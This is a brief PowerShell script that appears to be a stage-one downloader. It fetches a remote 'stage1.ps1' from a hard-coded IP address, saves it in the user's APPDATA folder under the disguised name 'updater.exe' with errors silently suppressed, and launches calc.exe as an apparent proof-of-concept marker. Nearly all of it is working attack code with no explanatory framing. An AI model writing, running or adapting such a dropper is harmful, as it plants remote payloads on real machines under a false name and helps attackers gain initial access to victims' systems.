
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://198.51.100.209/stage1.ps1",
    [string]$Stage2Path = "$env:APPDATA\updater.exe",
    [int]$ConnectionTimeout = 95
)
Invoke-WebRequest -Uri $PayloadUrl -OutFile $Stage2Path -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$StageMarker = "stage-29"
